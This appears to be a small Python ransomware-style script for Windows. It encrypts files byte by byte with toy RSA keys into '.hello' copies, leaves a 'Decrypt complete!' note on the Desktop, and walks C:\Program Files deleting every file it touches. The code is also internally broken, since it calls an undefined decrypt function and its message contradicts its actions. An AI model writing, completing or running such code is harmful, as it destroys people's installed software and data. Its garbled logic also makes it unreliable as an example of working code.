import os
from os.path import expanduser

def encrypt(file, path):
	N = 10403
	d = 6029
	e = 269

	f1 = open(path+"\\"+file, "rb")
	f2 = open(path+"\\"+file+".hello", "wb")

	arr = f1.read()

	f1.close()

	for i in arr:
		a = ((i**e) % N).to_bytes(2, 'big') 
		f2.write(a)

	f2.close()


home = expanduser("~")
f = open(home+"\\Desktop\\Hello!.txt", "w")
f.write("Decrypt complete! ^^")
f.close()

for (path, dire, files) in os.walk("C:\\Program Files"):
	file = os.listdir(path)
	for defiles in file:
		if(os.path.isdir(path+"\\"+defiles) == 1): 
			continue
		decrypt(defiles, path)
		os.remove(path+"\\"+defiles)